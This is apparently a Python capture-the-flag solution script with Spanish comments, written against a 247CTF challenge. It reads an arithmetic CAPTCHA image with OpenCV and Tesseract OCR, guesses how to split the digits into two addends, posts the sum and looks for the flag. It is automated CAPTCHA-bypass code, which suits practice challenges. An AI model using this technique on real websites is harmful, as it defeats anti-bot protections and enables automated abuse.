#!/usr/bin/env python3
import cv2
import numpy as np
import pytesseract
import requests
import re

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

def extract_numbers(img_bytes):
    """Extrae números de la imagen del CAPTCHA"""
    img_array = np.frombuffer(img_bytes, np.uint8)
    img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
    
    # Convertir a escala de grises
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    
    # Threshold 120 funciona mejor
    _, binary = cv2.threshold(gray, 120, 255, cv2.THRESH_BINARY)
    
    # Resize x3
    resized = cv2.resize(binary, None, fx=3, fy=3, interpolation=cv2.INTER_CUBIC)
    
    # OCR
    text = pytesseract.image_to_string(resized, config='--psm 7 -c tessedit_char_whitelist=0123456789').strip()
    
    return text

# Test
session = requests.Session()
session.get(BASE_URL)

img_response = session.get(BASE_URL + "mturk.php")
number_string = extract_numbers(img_response.content)

print(f"String detectado: '{number_string}'")
print(f"Longitud: {len(number_string)}")

# El formato podría ser algo como: XXXXXX + YY = ?
# O podría ser: XXX + YYY = ?
# Vamos a probar diferentes divisiones

if len(number_string) >= 3:
    # Probar diferentes puntos de división
    print("\nPosibles divisiones:")
    for split_point in range(1, len(number_string)):
        num1 = number_string[:split_point]
        num2 = number_string[split_point:]
        if num1 and num2:
            try:
                a = int(num1)
                b = int(num2)
                result = a + b
                print(f"  {a} + {b} = {result}")
            except:
                pass
    
    # Basándonos en el nombre "addition equations", probablemente sean dos números de tamaño similar
    # Para un string de 13 dígitos, podría ser 6+7, 7+6, o similar
    # Vamos a probar la división más probable (mitad)
    mid = len(number_string) // 2
    num1 = number_string[:mid]
    num2 = number_string[mid:]
    
    print(f"\nProbando división central:")
    print(f"  Num1: {num1}")
    print(f"  Num2: {num2}")
    
    if num1.isdigit() and num2.isdigit():
        a = int(num1)
        b = int(num2)
        result = a + b
        print(f"  Resultado: {a} + {b} = {result}")
        
        # Enviar
        data = {"captcha": str(result)}
        response = session.post(BASE_URL, data=data)
        
        # Ver respuesta
        alerts = re.findall(r"alert[^>]*>([^<]+)</", response.text)
        if alerts:
            for alert in alerts:
                print(f"\nMensaje del servidor: {alert}")
        
        if "flag" in response.text.lower() or "247ctf" in response.text.lower():
            print("\n" + "="*60)
            print(response.text)
